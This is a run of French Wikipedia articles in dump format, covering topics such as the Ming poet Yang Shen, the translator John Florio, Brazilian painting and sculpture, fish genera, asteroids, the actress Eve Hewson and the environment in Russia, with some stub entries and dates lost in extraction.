Yang Shen (pinyin : Yáng Shèn ; chinois : 杨慎 ; EFEO : Yang Chen), né en 1488, mort en 1559, est un écrivain et poète chinois de la dynastie Ming.
Biographie.
Yang Shen est issu d'une famille illustre, originaire du Sichuan. Il est le fils du Grand Secrétaire (1459-1529), en poste sous les empereurs Zhengde et Jiajing. Étudiant brillant, il réussit les examens impériaux du palais en 1511, parvenant à obtenir la première place. Sa carrière qui s'annonçait prometteuse fut néanmoins stoppée en 1524 lors de la querelle des rites qui coûta sa place à son père. Condamné à une bastonnade à laquelle il survécut difficilement, il fut contraint à l'exil dans une garnison du Yunnan, province reculée où la vie intellectuelle était quasi inexistante, ce qui était une grande contrariété pour les lettrés qui y étaient assignés. Il ne fut réhabilité qu'après sa mort, en 1567.
Yang Shen profita de cet exil, dans sa résidence située près de Kunming, pour rédiger avec plus de liberté qu'il ne l'aurait fait dans les cercles de la cour, et grâce à des amis et des admirateurs il put faire publier et même imprimer plusieurs de ses productions de son vivant. Après sa mort, en 1582, le gouverneur du Sichuan fit publier une édition complète de ses travaux avec l'aide de son neveu Yang Yujen.
Œuvre.
Écrivain aux talents variés, Yang Shen rédigea une histoire de sa région d'origine, le Sichuan, un mémoire sur sa région d'exil, le Yunnan, ainsi que des travaux d'anthologie et de critique littéraire, de phonologie et d'étymologie, des études portant sur les textes classiques.
Dans le domaine poétique, l'exil dans le Yunnan donne l'occasion à Yang Shen d'écrire dans un premier temps des poèmes assez conventionnels, inspirés par la poésie de Qu Yuan, le modèle obligé de la littérature écrite en exil. Il abandonne toutefois cette première manière pour écrire des poèmes plus originaux. Il est ainsi connu pour ses "ci", une forme poétique alors tombée en désuétude et qu'il renouvelle. Sa renommée au cours de la dynastie Ming est toutefois avant tout due à sa correspondance avec son épouse, Huang E (1498–1569). Celle-ci, après quelques années passées dans le Yunnan, était retournée dans le Sichuan pour s'occuper de l'administration des biens familiaux. Les lettres qu'ils ont échangées, incluant des poèmes, ont fait d'eux le type même du couple romantique, dont l'amour perdure malgré la séparation. Ces poèmes ont aussi donné à Huang E la réputation d'une poétesse de grand talent, bien qu'on lui ait attribué par la suite de nombreux poèmes qui n'étaient sans doute pas de sa main.
Postérité.
La renommée de Yang Shen en tant qu'auteur de "ci" a conduit à faire figurer des vers de Yang en tête de son édition du "roman des Trois Royaumes", dans les années 1660. Ces vers figurent encore couramment dans les éditions actuelles du roman.

</doc>
<doc id="9412081" url="https://fr.wikipedia.org/wiki?curid=9412081" title="Gnathopogon">
Gnathopogon

Gnathopogon est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. "Gnathopogon" se rencontre en Asie.
Liste des espèces.
Selon :

</doc>
<doc id="9412088" url="https://fr.wikipedia.org/wiki?curid=9412088" title="Geely Borui">
Geely Borui

La Geely Borui () est un véhicule du constructeur automobile chinois Geely vendue depuis avril 2015.
Il s'agit de la version de série du concept-car Geely Emgrand KC présenté au salon automobile de Shanghai en .
Motorisation.
La Geely Borui dispose de trois moteurs essence :
Ventes en Chine.
La Geely Borui a été lancée en .

</doc>
<doc id="9412089" url="https://fr.wikipedia.org/wiki?curid=9412089" title="Gobiobotia">
Gobiobotia

Gobiobotia est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. Le genre "Gobiobotia" se rencontre en Asie orientale.
Liste des espèces.
Selon :

</doc>
<doc id="9412090" url="https://fr.wikipedia.org/wiki?curid=9412090" title="Keeseville (New York)">
Keeseville (New York)

La "census-designated place" de Keeseville se trouve dans les comtés de Clinton et d'Essex, État de New York, aux États-Unis.

</doc>
<doc id="9412091" url="https://fr.wikipedia.org/wiki?curid=9412091" title="Rohu">
Rohu



</doc>
<doc id="9412093" url="https://fr.wikipedia.org/wiki?curid=9412093" title="(1569) Evita">
(1569) Evita

(1569) Evita est un astéroïde de la ceinture principale.
Description.
(1569) Evita est un astéroïde de la ceinture principale. Il fut découvert par Miguel Itzigsohn le à La Plata. Il présente une orbite caractérisée par un demi-grand axe de 3,14 UA, une excentricité de 0,133 et une inclinaison de 12,26° par rapport à l'écliptique.
Il fut nommé en hommage à l'actrice et femme politique argentine Evita, la femme du président argentin Juan Perón.

</doc>
<doc id="9412095" url="https://fr.wikipedia.org/wiki?curid=9412095" title="Tylototriton shanjing">
Tylototriton shanjing



</doc>
<doc id="9412098" url="https://fr.wikipedia.org/wiki?curid=9412098" title="(1839) Ragazza">
(1839) Ragazza

(1839) Ragazza est un astéroïde de la ceinture principale.
Description.
(1839) Ragazza est un astéroïde de la ceinture principale. Il fut découvert par Paul Wild le à l'observatoire Zimmerwald. Il présente une orbite caractérisée par un demi-grand axe de 2,8 UA, une excentricité de 0,166 et une inclinaison de 10,156° par rapport à l'écliptique.
Il fut nommé en référence à l'italien "ragazza", qui signifie fille.

</doc>
<doc id="9412099" url="https://fr.wikipedia.org/wiki?curid=9412099" title="Gobiocypris">
Gobiocypris



</doc>
<doc id="9412101" url="https://fr.wikipedia.org/wiki?curid=9412101" title="Wladimir Vogel">
Wladimir Vogel

Wladimir Rudolfovitch Vogel, né le à Moscou et mort le à Zurich, est un compositeur suisse d'origine allemande et russe.
Biographie.
Fils de Rudolf, commerçant allemand de Dresde, et d'Emma Gerzberg, Juive d'origine germano-balte, Wladimir Vogel étudie d'abord la composition à Moscou avec Scriabine. 
Pendant la Première Guerre mondiale, il est interné dans l'Oural en raison de son origine allemande. Entre 1918 et 1924, il étudie avec Heinz Tiessen et Ferruccio Busoni à Berlin, où il enseigne par la suite (1929-1933) au . Il est proche du cercle expressionniste autour de Herwarth Walden et est actif (avec George Antheil, Hanns Eisler, Philipp Jarnach, Stefan Wolpe et Kurt Weill) dans la section de la musique du Groupe Novembre de Max Butting et Hans Heinz Stuckenschmidt.
En 1933, accusé d'être un « artiste dégénéré » par le régime nazi, il quitte l'Allemagne et se rend à Strasbourg, Bruxelles, Paris et Londres. Il se tourne d'abord vers la technique dodécaphonique avec son "Concerto pour violon" en 1937. Èmigré définitivement en Suisse à partir de 1935, il vit à Ascona, et à partir de 1964 à Zurich. Jusqu'à ce qu'il devienne citoyen suisse en 1954, il n'est pas autorisé à travailler en Suisse, et compte sur le soutien de riches mécènes et de son épouse, l'écrivaine Aline Valangin. Pendant ce temps, il enseigne la composition en privé. Il est actif dans la Société internationale pour la musique contemporaine. Il participe aux « Sessions d’études musicales et dramatiques » d'Hermann Scherchen à Strasbourg, et organise un colloque international de musique dodécaphonique à Orselina en 1948. 
Il a notamment pour élèves Erik Bergman, Maurice Karkoff, Rodolfo Holzmann, Robert Suter, Einojuhani Rautavaara et Rolf Liebermann.
Wladimir Vogel épouse en 1930 Katja Sommer, en 1954 Aline Valangin et en 1965 Ida Maria Tschudi.
Mort en 1984, il est inhumé dans le cimetière de Witikon près de Zurich.

</doc>
<doc id="9412102" url="https://fr.wikipedia.org/wiki?curid=9412102" title="Superamas stellaire">
Superamas stellaire

Un superamas stellaire (en anglais "super star cluster", en abrégé SSC) est un amas ouvert jeune et très massif dont on pense qu'il est le précurseur d'un amas globulaire. Ils contiennent typiquement un grand nombre d'étoiles jeunes et qui ionisent une région H alentour, similaires aux « régions H ultra-denses » (UDH pour "Ultra Dense H regions") de la Voie lactée. Une région H d'un superamas stellaire est à son tour entourée par un cocon de poussière. Souvent, les étoiles et les régions H seront invisibles lors d'observations optiques à cause des hauts niveaux d'extinction. Par conséquent, les jeunes superamas stellaires sont plutôt observés en radio et en infrarouge.
Les seules caractéristiques des superamas stellaires sont leurs grandes densité d'électrons ("n"=10–10 cm) et pression ("P"/"k"=10–10 K cm).

</doc>
<doc id="9412104" url="https://fr.wikipedia.org/wiki?curid=9412104" title="Île aux Rats">
Île aux Rats



</doc>
<doc id="9412107" url="https://fr.wikipedia.org/wiki?curid=9412107" title="Hemibarbus">
Hemibarbus

Hemibarbus est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes.
Liste des espèces.
Selon :

</doc>
<doc id="9412108" url="https://fr.wikipedia.org/wiki?curid=9412108" title="Sinan Gümüş">
Sinan Gümüş

Sinan Gümüş, né le à Pfullendorf en Allemagne, est un footballeur germano-turc qui évolue au poste d'ailier droit dans le club d'Eyüpspor.
Biographie.
Il commence sa carrière professionnelle avec la réserve du VfB Stuttgart. 
En 2014, il est transféré au club turc de Galatasaray. Il est sous contrat avec ce club jusqu’en . Lors du mercato d'été 2015, il est dans le viseur de l'AS Monaco.
En fin de contrat avec Galatasaray, Gümüş rejoint gratuitement le Genoa CFC en . Il ne joue que trois matchs avant à la trêve hivernale et est de fait logiquement prêté à l'Antalyaspor pour retrouver du temps de jeu.
Il signe en un contrat de 3 ans avec Fenerbahçe.

</doc>
<doc id="9412109" url="https://fr.wikipedia.org/wiki?curid=9412109" title="Bone Daddy (film, 1998)">
Bone Daddy (film, 1998)

 est un thriller américano-canadien de Mario Azzopardi, sorti en 1998 avec Rutger Hauer, tourné à Chicago et à Toronto.
Synopsis.
William Palmer, écrivain apprécié de romans policiers, publie un livre sur un dangereux serial killer psychopathe "Bone Daddy" qui a commis des crimes insoutenables il y a quelques années et qui n'a toujours pas été arrêté.
Le tueur inactif depuis des années, n'apprécie guère cette littérature qui le projette sur le devant de la scène. Il s'en prend à l'agent littéraire de Palmer et le démembre vivant, laissant ici et là, une main, un tibia de la victime, afin de narguer les enquêteurs. Avec l'inspecteur de police Sharon, Palmer va essayer de décrypter la personnalité du tueur, mais le profil lui fait soupçonner son propre fils, jeune médecin légiste fort jaloux du succès de son père.

</doc>
<doc id="9412110" url="https://fr.wikipedia.org/wiki?curid=9412110" title="Microphysogobio">
Microphysogobio

Microphysogobio est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. On le rencontre en Asie orientale.
Liste des espèces.
Selon :

</doc>
<doc id="9412114" url="https://fr.wikipedia.org/wiki?curid=9412114" title="Pseudogobio">
Pseudogobio

Pseudogobio est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes. Les espèces de ce genre se rencontrent en Asie de l'Est.
Liste des espèces.
Selon :
Étymologie.
Il semblerait que le genre "Pseudogobio" (du grec ancien , "pseudês", « faux, erroné ») doive son nom au précédent classement de son espèce type, "Pseudogobio esocinus", dans le genre "Gobio" et à l'apparente relation entre ces deux genres.

</doc>
<doc id="9412118" url="https://fr.wikipedia.org/wiki?curid=9412118" title="John Florio">
John Florio

John Florio (Londres, 1553 - Fulham près de Londres, 1625), connu également sous son nom italien de Giovanni Florio (prononciation ), et plus rarement sous la forme francisée Jean Florio, était un linguiste, lexicographe et traducteur anglais d’ascendance italienne.
Né d’un père italien protestant ayant dû chercher refuge en Angleterre pour échapper à l’Inquisition dans son pays, et d’une mère probablement anglaise, il passa ses jeunes années dans les Grisons en Suisse, puis, après des études en Allemagne, retourna en Angleterre où, fort de sa formation humaniste et polyglotte, il trouva bientôt à s’employer comme précepteur et professeur d’italien et de français auprès de personnes issues de toutes les classes sociales : marchands, nobles, artistes, princes, et même une reine, Florio occupant le poste de maître de langues à la cour royale de Jacques.
Il figure comme un précurseur tant dans le domaine de la traduction (il fut le premier à traduire en anglais les "Essais" de Montaigne et des passages du "Décaméron" de Boccace) que dans celui de la lexicographie, étant en effet l’auteur d’un dictionnaire anglais-italien dans lequel, pour la première fois, il eut l’idée d'admettre des vocables du langage courant et des termes de métier. Son dictionnaire et sa traduction des "Essais" de Montaigne passent aujourd’hui pour de véritables monuments de la Renaissance anglaise et des lettres élisabéthaines. On lui doit par ailleurs des manuels d’apprentissage de l'italien, composés de dialogues pédagogiques, de recueils de proverbes italiens, d’observations sur la langue italienne etc.
Il fut peut-être un ami de William Shakespeare, ou eut à tout le moins une influence sur lui. Une théorie le propose comme le véritable auteur de l’œuvre shakespearienne.
Le père : Michelangelo Florio.
Né à Londres, John Florio était d’origine anglo-italienne et se qualifiait lui-même d’« Anglais en italien ». Son père, , natif de Toscane, avait été un moine franciscain avant de se convertir au protestantisme. Après s’être enhardi à prêcher à Naples, Padoue et Venise, il fut finalement inquiété par l’Inquisition en Italie et dut chercher refuge en Angleterre, alors sous le règne d’Édouard VI. En 1550, il trouva à s’employer comme pasteur de la congrégation protestante italienne à Londres et fit également partie du personnel de la maison de l'homme d'État William Cecil. Il fut cependant, sur l’accusation d’immoralité, éconduit de l’un comme de l’autre poste, quoique William Cecil voulût bien lui accorder plus tard son entier pardon. L’on sait peu de chose de la mère de John Florio ; il se peut qu’elle fût anglaise.
Michelangelo Florio se fit ensuite précepteur italien de Jeanne Grey, avant de le devenir auprès de la famille de William Herbert, de Pembroke, père de Henry Herbert, de Pembroke, lequel épousera Mary Sidney, sœur de Philip Sidney. Il rédigea à l’intention de Henry Herbert et Jane Grey, ses deux élèves de plus haut rang, un ouvrage intitulé "Regole de la lingua thoscana" (litt. "Règles de la langue toscane"). Les jeunes années, la foi, et la mort de Lady Jane Grey le touchèrent profondément, à telle enseigne que plus tard, retiré à Soglio en Suisse, il entreprit d’écrire un livre sur sa vie, lequel ne parut qu’en 1607, mais fut rédigé sans doute vers 1561-1562 ; il y décrit Jane Grey comme une martyre et comme une « sainte » innocente, et il est possible qu’il eût été témoin de certains des événements la concernant ou qu’il l’eût entretenue des persécutions en Italie.
Départ en exil des Florio.
Le biographe Anthony Wood relate que la famille Florio, qui à présent comptait parmi ses membres le jeune bébé John Florio, quitta l’Angleterre à l’accession au trône de la reine Marie. À Strasbourg, Michelangelo Florio fit la connaissance de membres de la famille aristocratique De Salis-Soglio de Bregaglia, dans le canton des Grisons, en Suisse italienne protestante. Le comte de Salis offrit à Michelangelo un poste de pasteur à Soglio, auquel poste étaient attachés la disposition d’un logis (actuellement aménagé en restaurant) sis au bord d’un précipice, la fonction d’instituteur local, et le statut de prédicateur réformé. Soglio se trouvait loin de l’Inquisition et à peu de distance de Chiavenna, au nord du lac de Côme en Italie, foyer de prédication réformée. John Florio grandit en parlant italien avec son père, et probablement en parlant dans le même temps couramment l’anglais avec sa mère. Son père lui aurait enseigné le français et l’allemand. Lorsqu’il eut sept ans, le théologien protestant réformé Pier Paolo Vergerio, qui était originaire de Capodistria en Vénétie mais vécut aussi à Bregaglia en Suisse, l’envoya vivre et se faire scolariser à Tubingue en Allemagne, puis plus tard s’inscrire dans une université allemande. Au début de la décennie 1570, John, en possession désormais d’une solide formation chrétienne réformée et humaniste, et sans doute accompagné de sa mère, s’en retourna en Angleterre, alors sous le règne de la reine Élisabeth.
Activité en Angleterre.
John Florio jugeait les Anglais frustes et barbares et se proposait d’apprendre aux aristocrates protestants les manières européennes, de les doter de compétences en langues et de les pourvoir d’expressions policées. Cette mission rejoignait d’une certaine façon celle de Philip Sidney, qui s’efforça de former les Anglais à écrire et à lire les Écritures dans leur propre langue, dûment enrichie à cet effet. Ainsi Florio voulut-il initier les Anglais aux proverbes italiens.
Tandis qu’il travaillait comme précepteur et concomitamment comme espion (pour le compte de Sir Francis Walsingham, maître-espion de la reine Élisabeth) au domicile de l’ambassadeur de France, Michel de Castelnau de la Mauvissière, en 1583-1585, Florio s’était lié d’amitié avec Giordano Bruno. L’historienne Frances Yates rapporte l’histoire d’un dîner animé qui eut lieu au palais de Whitehall et lors duquel Florio traduisit à l’intention de la compagnie assemblée, dont faisaient partie Sir Philip Sidney et des professeurs d’Oxford, les théories de Bruno sur la possibilité d’une vie sur d’autres planètes. John Florio résida ensuite quelque temps à Oxford, et se trouvait vers 1576 employé comme précepteur auprès du fils de Richard Barnes, évêque de Durham, qui étudiait alors à Magdalen College.
En 1578, Florio publia un ouvrage intitulé "First Fruits, which yield Familiar Speech, Merry Proverbs, Witty Sentences, and Golden Sayings" (litt. "Premiers Fruits, apportant parler familier, proverbes plaisants, maximes spirituelles et dictons d’or"), qui parut accompagné du livre "A Perfect Induction to the Italian and English Tongues". L’ouvrage était dédié à Robert Dudley, de Leicester. Trois ans plus tard, John Florio fut admis comme membre de Magdalen College et devint enseignant en français et italien dans cette université. En 1591 parurent ses "Second Fruits, to be gathered of Twelve Trees, of divers but delightsome Tastes to the Tongues of Italian and English men" (litt. "Deuxièmes Fruits, à recueillir de douze arbres, aux saveurs diverses mais délectables à la langue d’hommes italiens et anglais"), auxquels l’auteur joignit "Garden of Recreation, yielding six thousand Italian Proverbs" (litt. "Jardin d’agrément, produisant six mille proverbes italiens"). Ces manuels comprenaient un précis de grammaire, un choix de dialogues en italien et anglais disposés en colonnes parallèles, et de longs extraits d’écrivains italiens classiques en prose et en vers.
Florio eut de nombreux patrons. Il déclare avoir vécu quelques années avec Henry Wriothesley, comte de Southampton, peut-être le jeune homme qui est évoqué dans les sonnets de Shakespeare, et il y a un compte rendu d’un incident impliquant Florio survenu dans le manoir que le comte possédait dans le Hampshire, près de l’. William Herbert, de Pembroke, se lia également d'amitié avec lui. Dans son testament, Florio légua des dons au comte de Pembroke, à la condition expresse qu’il prît soin de Rose, sa seconde femme. Son dictionnaire italien-anglais, titré "A World of Words" (litt. "Un monde de mots"), fut publié "in folio" en 1598. À la suite de la montée au trône de , Florio fut nommé précepteur de français et d’italien auprès du prince Henry, puis devint gentilhomme de la Chambre privée et Clerc du Cabinet de la reine-consort Anne de Danemark, qu’il fut aussi chargé d'instruire dans les langues étrangères.
Une version substantiellement enrichie de "A World of Words" parut en 1611 sous le titre de "Queen Anna's New World of Words, or Dictionarie of the Italian and English tongues, Collected, and newly much augmented by Iohn Florio, Reader of the Italian vnto the Soueraigne Maiestie of Anna, Crowned Queene of England, Scotland, France and Ireland, &amp;c. And one of the Gentlemen of hir Royall Priuie Chamber. Whereunto are added certaine necessarie rules and short obseruations for the Italian tongue" (soit : "Nouveau Monde des mots de la reine Anne, ou Dictionnaire des langues italienne et anglaise, composé et récemment très augmenté par Iohn Florio, maître d’italien auprès de sa Majesté souveraine Anna, Reine couronnée d’Angleterre, d’Écosse, de France et d’Irlande, &amp;c. et l’un des gentilshommes de sa Royale Chambre privée. Auquel ont été ajoutées certaines règles nécessaires et de brèves observations de la langue italienne").
Son œuvre majeure cependant est son admirable traduction des "Essais" de Montaigne sous le titre "Essayes on Morall, Politike, and Millitarie Discourses of Lo. Michaell de Montaigne", publiée "in folio" en 1603 en trois volumes, chacun dédié à deux dames nobles. Une deuxième édition en 1613 sera dédiée à la reine. La première édition acquit un intérêt particulier par le fait qu’un exemplaire de celle-ci, conservé à la British Library, porte la signature de Shakespeare, longtemps admise comme authentique mais aujourd’hui supposée provenir d’une main du ; un autre exemplaire est orné de la signature de Ben Jonson. Il a été suggéré par William Warburton que Florio a été satirisé par William Shakespeare sous les espèces du personnage de Holofernes, le pompeux pédant de "Peines d’amour perdues" ; cependant il est probable, attendu en particulier qu’il était l’un des protégés du comte de Southampton, qu’il figurait parmi les amis personnels du dramaturge, lequel a pu, par le biais de Florio, s’initier aux littératures française et italienne.
Florio épousa la sœur du poète Samuel Daniel, qui travaillait chez la famille de Mary Sidney, comtesse de Pembroke, personnage central du cercle littéraire Wilton. Il entretint des rapports amicaux avec nombre d’autres poètes et écrivains du moment. Ben Jonson lui envoya un exemplaire de "Volpone", doté de la dédicace « À son père aimant et ami précieux, maître John Florio, Ben Jonson scelle le présent témoignage de son amitié et affection ». Il fut caractérisé par Anthony Wood, dans "Athenae Oxonienses", comme un homme très utile dans sa profession, zélé pour sa religion, et profondément attaché à son pays d’adoption.
Il mourut à Fulham, près de Londres, à l’automne 1625, apparemment dans l'indigence, par suite du non versement de sa pension. Sa maison de Shoe Lane dut être vendue pour acquitter ses nombreuses dettes, mais sa fille Élisabeth, née en 1589, fit un bon mariage. Les autres descendants de Florio, ses fils Joane, baptisé à Oxford en 1585, et Edward, né en 1588, devinrent médecins du Roi, et appartenaient au tissu social des classes professionnelles anglaises à haute qualification.
Thèse de la paternité des œuvres de Shakespeare.
Florio est l’un des nombreux candidats proposés comme étant les véritables auteurs des œuvres de William Shakespeare. La candidature d’un Italien, que ce soit Giovanni ou son père Michelangelo Florio, au titre de créateur de l’œuvre de Shakespeare était liée initialement à la résurgence du nationalisme italien à l’époque fasciste. La théorie s’appuie notamment sur l’argument, également avancé par d’autres "anti-stratfordiens", que l’œuvre de Shakespeare dénote une connaissance intime de la culture et de la géographie italiennes. Florio fut ainsi proposé par Santi Paladino en 1927, toutefois Paladino tendait à confondre John et son père Michelangelo. Il postula que Florio était issu d’une famille calviniste de Sicile ; contraint de fuir l’Italie pour l’Angleterre protestante, il aurait forgé le nom « Shakespeare » en traduisant mot à mot en anglais le patronyme de sa mère sicilienne, "Crollalanza". Erik Reger fut le premier à proposer spécifiquement John Florio, dans une recension du pamphlet de Paladino, intitulée « Der Italiener Shakespeare » et publiée en 1927 dans la "Deutsche Allgemeine Zeitung". Plus tard, Paladino argua que les deux Florio collaboraient, et poursuivit ses publications sur le sujet jusque dans les années 1950. Dans ses derniers écrits, il affirma que Michelangelo Florio écrivit les œuvres d’abord en italien et que son fils Giovanni les rendait ensuite en anglais. Depuis lors, l’un ou l’autre des deux Florio a été mis en avant tour à tour par Franz Maximilian Saalbach (1954), Martino Iuvara (2002) et plus récemment par Lamberto Tassinari (2008).
Ce dernier en particulier souligne que le style de Florio était hautement apprécié, en premier lieu par son ami le dramaturge et poète Ben Jonson, ensuite par son beau-frère, Samuel Daniel, puis par les biographes de Florio, Clara Longworth de Chambrun (1921), Frances Yates (1934) et les critiques littéraires Felix Otto Matthiessen (1931) et André Koszul (1931). Frances Yates rangea la traduction de Florio des "Essais" de Montaigne parmi les classiques de la littérature anglaise, surpassée seulement par la traduction de la bible dite "bible du roi Jacques".
Scott McCrea, auteur de "The Case for Shakespeare: The End of the Authorship Question" (2005), analysant l’ouvrage de Lamberto Tassinari, déclara que ce livre fourmillait d’« incohérences et de logique ridicule ». McCrea se réfère en particulier à l’argument de Tassinari selon lequel Shakespeare massacra à dessein la langue italienne dans ses pièces parce qu’il voulait « dissimuler son identité en mutilant son italien », affirmation qui selon Scott McCrea contredit « sa mission d’améliorer la culture anglaise ». McCrea compare la poésie de Florio à celle de Shakespeare, et observe que « lire Shakespeare en regard de Florio vous fait péniblement prendre conscience combien belles et poétiques sont même les deux dédicaces à Southampton, et combien prosaïque et fondamentalement différent est l’esprit de Florio ». Saul Gerevini et Giulia Harding ont au contraire estimé que le langage de John Florio apparaît poétiquement semblable à celui de Shakespeare.

</doc>
<doc id="9412119" url="https://fr.wikipedia.org/wiki?curid=9412119" title="Zaitunia akhanii">
Zaitunia akhanii

Zaitunia akhanii est une espèce d'araignées aranéomorphes de la famille des Filistatidae.
Distribution.
Cette espèce est endémique d'Iran. Elle se rencontre dans les provinces de Téhéran et de Markazi.
Description.
La femelle paratype mesure .
Les femelles mesurent de à .
Étymologie.
Cette espèce est nommée en l'honneur de Hossein Akhani.

</doc>
<doc id="9412120" url="https://fr.wikipedia.org/wiki?curid=9412120" title="Giovanni Florio">
Giovanni Florio



</doc>
<doc id="9412124" url="https://fr.wikipedia.org/wiki?curid=9412124" title="Peinture et sculpture au Brésil">
Peinture et sculpture au Brésil

La peinture et la sculpture au Brésil sont le résultat de l'histoire de ce pays et prennent leurs racines dans la diversité des cultures qui s'y sont mêlées.
Arts précolombiens.
Les plus anciens exemples connus de l'art premier au Brésil sont des peintures rupestres dans le parc national de Serra da Capivara, dans l'État de Piauí, remontant à environ Dans le Minas Gerais et le Goiás ont été découvertes des œuvres plus récentes montrant des motifs géométriques et des formes animales. 
L'un des types les plus sophistiqués de l'artéfact précolombien trouvé au Brésil sont par contre les céramiques de culture Marajoara (environ 800 à 1400 ans ), sur l'île de Marajo, et les statuettes et objets de culte associés à cette culture, tels que les petites amulettes en pierre de taille appelés muiraquitãs. 
L'époque coloniale et le style baroque.
À la suite de la colonisation et de l'implantation de jésuites, le style baroque domine ensuite au Brésil sur une longue période, jusqu'au début du . Il prospère notamment à Bahia, Pernambuco, Minas Gerais, générant des artistes de valeur comme le sculpteur sur bois et architecte Aleijadinho. Les autres auteurs des statues de bois polychromes et des sculptures de pierre, sont bien souvent restés inconnus, ne signant pas, même si l'on sait que la plupart de ces artistes sont des métis et des gens de condition fort modeste. Si ce style a certaines caractéristiques du baroque européen, la dramatisation, l'emphase, l'outrance quelquefois, il devient ici l'art du peuple, et s'imprègne du mélange des cultures.
Des artistes européens explorent également le pays, dès le , comme en témoignent les tableaux des paysagistes néerlandais Albert Eckhout et Frans Post. Ceux-ci relèvent dans leurs créations, de style plus classique, les paysages, la végétation, la nourriture de cette contrée étonnante, mais aussi la vie des esclaves et des indiens. Au , le Portugal ferme le Brésil aux étrangers. L'art baroque local continue à se développer en toute autonomie.
Le néo-classicisme et le romantisme.
En 1816, la Mission artistique française au Brésil crée l'art académique brésilien. Mais ce style reste limité à Rio de Janeiro. En province, le baroque perdure. Ce courant néo-classique impose toutefois un nouveau concept d'éducation artistique, base d'une révolution dans la peinture brésilienne, la sculpture, l'architecture, les arts graphiques, et l'artisanat. 
Quelques-uns décennies plus tard, sous le patronage personnel de l'empereur Dom Pedro II, qui engage le pays dans un programme ambitieux de modernisation, l'Académie atteint son âge d'or, favorisant l'émergence de la première génération de peintres romantiques, tels que Victor Meirelles et Pedro Américo. Le style romantique prend une forme particulière dans la peinture brésilienne, plus académique que dans sa version européenne.
Le modernisme.
Le début du est marqué d'une lutte entre les écoles précédentes et des tendances modernistes.
Deux femmes, Anita Malfatti et Tarsila do Amaral, sont parmi les pionniers de l'art brésilien moderne, un des plus fascinants du monde. Elles participent toutes deux, en 1922, à une semaine d'art moderne, qui marque la naissance d'un mouvement de remise en cause intellectuelle et artistique connu sous le nom de « modernisme », un mouvement représenté en littérature par Mario de Andrade. Mais il faut leur adjoindre aussi des artistes tels que Alfredo Volpi, Cícero Dias, Emiliano Di Cavalcanti, Vicente do Rego Monteiro et Victor Brecheret.
L'art contemporain.
Candido Portinari, au milieu du est un des artistes les plus importants du pays, presque l'artiste officiel du Brésil, puisant en partie son inspiration dans le folklore sud-américain, quand il illustre le roman de José Maria Ferreira de Castro, "A Selva" (la Forêt vierge), ou quand il dessine des scènes de danses ou de travaux agricoles.
Des sculpteurs tels que Sérgio de Camargo, Marta Colvin, ou Sonia Ebling sont peut-être plus proches de l'art contemporain européen, alors que la peintre Lygia Clark est associée au mouvement néo-concret brésilien et au mouvement tropicaliste, imprégné de l'histoire du pays.
Au cours de ces dernières décennies, les peintures d’Oscar Araripe, né en 1941, Beatriz Milhazes, née en 1960, Romero Britto, né en 1963, ou les sculptures d'Ernesto Neto, né en 1964, sont particulièrement remarqués.

</doc>
<doc id="9412133" url="https://fr.wikipedia.org/wiki?curid=9412133" title="Eve Hewson">
Eve Hewson

Memphis Eve Sunny Day Hewson, dite Eve Hewson, est une actrice irlandaise, née le à Dublin.
Biographie.
Eve Hewson est la deuxième fille de la militante Ali Hewson (née Alison Stewart) et du chanteur de U2, Bono (Paul David Hewson). Elle fait ses études au puis à l'université de New York.
Carrière.
Elle débute en 2008 dans le film "The 27 Club" d'Erica Dunton. Deux ans plus tard, elle joue dans un clip du groupe irlandais "The Script."
En 2011, elle tourne sous la direction de Paolo Sorrentino dans "This Must Be the Place".
En 2013, elle joue dans le premier film américain de Guillaume Canet : "Blood Ties" et également dans "All About Albert".
En 2014, elle fait ses débuts sur le petit écran, où elle retrouve Clive Owen dans "The Knick", après "Blood Ties". L'année suivante, elle est présente dans "Le Pont des espions" réalisé par Steven Spielberg.
En 2018, elle incarne Nenette dans le remake "Papillon" de Michael Noer, puis joue Marianne dans la nouvelle adaptation de "Robin des Bois" réalisé par Otto Bathurst et dans "Paper Year" de Rebecca Addelman.
En 2020, elle joue aux côtés d'Eva Green et Himesh Patel dans la série néo-zélandaise "The Luminaries" et le biopic "Tesla" de Michael Almereyda. L'année suivante, elle joue dans le thriller "Mon amie Adèle", diffusée en début d'année sur Netflix.
En 2022, elle est à l'affiche de la série britannique "Bad Sisters", aux côtés de Sharon Horgan, Anne-Marie Duff, Eva Birthistle et Sarah Greene.
En septembre, 2024, elle tient l'un des rôles principaux dans la série "Un couple parfait" sortie sur Netflix.

</doc>
<doc id="9412134" url="https://fr.wikipedia.org/wiki?curid=9412134" title="Île aux Chrétiens">
Île aux Chrétiens

Lîle aux Chrétiens ("Enez ar C'hrizienn" en breton) est une île de l'archipel de Molène, dans le Finistère, en Bretagne. Elle est située sur le territoire de la commune du Conquet.
Histoire.
Il y a un tumulus sur l'île.

</doc>
<doc id="9412135" url="https://fr.wikipedia.org/wiki?curid=9412135" title="Sarcocheilichthys">
Sarcocheilichthys

Sarcocheilichthys est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes.
Liste des espèces.
Selon - 12 espèces :

</doc>
<doc id="9412136" url="https://fr.wikipedia.org/wiki?curid=9412136" title="Environnement en Russie">
Environnement en Russie

Lenvironnement en Russie est l'environnement (ensemble des éléments - biotiques ou abiotiques - qui entourent un individu ou une espèce et dont certains contribuent directement à subvenir à ses besoins) du pays Russie. Pays le plus grand de la planète, et couvert à 60 % de forêt, c'est l'un des pays au monde qui compte le plus de réserves de biosphère. 
Les russes exploitent les ressources du territoire (notamment le gaz, l'aluminium, le pétrole), avec parfois une pression excessive (irrigation intensive, un des facteurs d'assèchement de la mer d'Aral). Les émissions de gaz à effet de serre sont amplifiées par le gaz brûlé dans les torchères et les incendies - qui sont par ailleurs destructeurs pour la biodiversité ; mais les forêts constituent un important puits de carbone. La gestion des déchets est préoccupante, avec des milliers de décharges et un taux de recyclage faible. 
En matière environnementale, la Russie souffre du passé soviétique axé sur une industrialisation lourde et l'interdiction de partis ou associations écologiques. La ratification du protocole de Kyoto par la Russie a permis son entrée en vigueur en 2004 ; elle s'est également engagée dans le cadre de la COP21 en 2015.
